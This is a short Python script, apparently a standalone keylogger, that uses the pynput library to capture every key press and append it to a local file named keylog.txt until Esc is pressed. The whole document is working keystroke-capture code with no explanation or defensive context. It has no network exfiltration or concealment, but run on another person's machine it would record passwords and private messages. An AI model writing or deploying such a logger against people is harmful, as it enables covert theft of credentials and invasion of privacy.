from pynput.keyboard import Key, Listener

# Log file path
LOG_FILE = "keylog.txt"

# Function to write to the log file
def write_to_log(key):
    with open(LOG_FILE, 'a') as f:
        f.write(str(key) + '\n')

# Function to handle key press
def on_press(key):
    write_to_log(key)

# Function to handle key release (optional)
def on_release(key):
    if key == Key.esc:  # Press 'Esc' to stop the keylogger
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
